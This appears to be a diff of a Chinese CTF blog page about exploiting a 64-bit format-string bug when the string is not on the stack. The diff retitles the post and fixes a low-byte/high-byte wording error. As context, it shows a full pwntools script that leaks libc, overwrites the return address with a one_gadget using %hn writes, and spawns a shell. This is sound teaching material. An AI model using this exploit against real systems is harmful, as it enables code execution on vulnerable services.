@@ -6,11 +6,11 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>fmt_x64——格式化字符串不在栈上 | ZhouYetao</title>
+  <title>fmt_x64之格式化字符串不在栈上 | ZhouYetao</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="对于32位的elf来说，pwntools有现成的函数fmt_str可以使用，但是对于64位的elf，就需要自己手动构建。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="fmt_x64——格式化字符串不在栈上">
+<meta property="og:title" content="fmt_x64之格式化字符串不在栈上">
 <meta property="og:url" content="http://example.com/2021/09/16/fmt-x64%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E5%9C%A8%E6%A0%88%E4%B8%8A/index.html">
 <meta property="og:site_name" content="ZhouYetao">
 <meta property="og:description" content="对于32位的elf来说，pwntools有现成的函数fmt_str可以使用，但是对于64位的elf，就需要自己手动构建。">
@@ -41,7 +41,7 @@
 <meta property="og:image" content="http://example.com/images/pasted-40.png">
 <meta property="og:image" content="http://example.com/images/pasted-41.png">
 <meta property="article:published_time" content="2021-09-16T05:13:00.000Z">
-<meta property="article:modified_time" content="2021-09-16T07:39:09.118Z">
+<meta property="article:modified_time" content="2021-09-16T11:02:28.167Z">
 <meta property="article:author" content="ZhouYetao">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="fmt">
@@ -190,7 +190,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      fmt_x64——格式化字符串不在栈上
+      fmt_x64之格式化字符串不在栈上
     </h1>
   
 
@@ -264,7 +264,7 @@
 <p><img src="/images/pasted-37.png" alt="upload successful"></p>
 <p>其实0x7ffd6388f448这个地址是指向0x26这个值（linux中数据存储为小端序，这里不展开讲）。更直观可以使用命令x/b 0x7ffd6388f448查看0x7ffd6388f448指向的单个字节（由于重新运行了程序，地址不一样，但是本质是一样的）：</p>
 <p><img src="/images/pasted-38.png" alt="upload successful"></p>
-<p>如果理解了这一点，也就一定可以理解为什么payload中要讲return的地址加二，目的是为了指向低字节，修改one_gadget的低字节：</p>
+<p>如果理解了这一点，也就一定可以理解为什么payload中要讲return的地址加二，目的是为了指向高字节，修改one_gadget的高字节：</p>
 <p><img src="/images/pasted-39.png" alt="upload successful"></p>
 <h5 id="第四步调用one-gadget完成getshell"><a href="#第四步调用one-gadget完成getshell" class="headerlink" title="第四步调用one_gadget完成getshell"></a>第四步调用one_gadget完成getshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;%&quot; + str(hign_onegadget) + &quot;c%35$hnstep4&quot;</span><br></pre></td></tr></table></figure>
 <p>动态结果：</p>
@@ -273,44 +273,6 @@
 <p><img src="/images/pasted-41.png" alt="upload successful"></p>
 <p>最后附上完整脚本，完整脚本稍作调整：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line">p = process([&#x27;./test&#x27;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;&#125;)</span><br><span class="line"># p = remote(&quot;81.68.86.115&quot;, 10001)</span><br><span class="line">libc = ELF(&quot;./libc.so&quot;)</span><br><span class="line"># libc = ELF(&quot;./libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line"># leak stack_addr and __libc_start_main ---&gt; leak libcbase</span><br><span class="line">payload = &quot;%7$p#%9$p@&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">__libc_start_main = int(p.recvuntil(&quot;#&quot;,True),16) - 240 </span><br><span class="line">retn_addr = int(p.recvuntil(&quot;@&quot;,True),16)- 0xe0</span><br><span class="line">log.success(&quot;__libc_start_main:0x%x&quot;,__libc_start_main)</span><br><span class="line">log.success(&quot;retn_addr:0x%x&quot;,retn_addr)</span><br><span class="line"></span><br><span class="line">one_gadget = [0xe6e73,0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">libcbase = __libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">onegadget = libcbase + one_gadget[1]</span><br><span class="line">log.success(&quot;libcbase:0x%x&quot;,libcbase)</span><br><span class="line">log.success(&quot;onegadget:0x%x&quot;,onegadget)</span><br><span class="line"></span><br><span class="line"># change retn_addr</span><br><span class="line">hign_onegadget = (onegadget &gt;&gt; 16)&amp;0xffff</span><br><span class="line">low_onegadget = onegadget&amp;0xffff</span><br><span class="line">low_retn = retn_addr&amp;0xffff</span><br><span class="line">hign_retn = (retn_addr + 2)&amp;0xffff</span><br><span class="line">log.success(&quot;hign_onegadget:0x%x&quot;,hign_onegadget)</span><br><span class="line">log.success(&quot;low_onegadget:0x%x&quot;,low_onegadget)</span><br><span class="line">log.success(&quot;hign_retn:0x%x&quot;,hign_retn)</span><br><span class="line">log.success(&quot;low_retn:0x%x&quot;,low_retn)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(low_retn) + &quot;c%9$hnstep1&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(low_onegadget) + &quot;c%35$hnstep2&quot;</span><br><span class="line">p.sendlineafter(&quot;step1&quot;,payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(hign_retn) + &quot;c%9$hnstep3&quot;</span><br><span class="line">p.sendlineafter(&quot;step2&quot;,payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload = &quot;%&quot; + str(hign_onegadget) + &quot;c%35$hnstep4&quot;</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendlineafter(&quot;step3&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(&quot;step4&quot;,&quot;61happy\x00&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
       
 
       
@@ -360,7 +322,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/pwn-note//" class="article-tag-list-link color4">pwn-note</a>
+        			<a href="/categories/pwn-notes//" class="article-tag-list-link color5">pwn-notes</a>
         		</li>
       		
 		</ul>
@@ -428,6 +390,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2021/09/16/iot-pwn-tenda/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          iot_pwn_tenda
+        
+      </div>
+    </a>
   
   
     <a href="/2021/09/13/ret2-libc-csu-init/" id="article-nav-older" class="article-nav-link-wrap">
@@ -587,6 +558,10 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">stackoverflow</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">iot</a>
               </li>
             
             <div class="clearfix"></div>
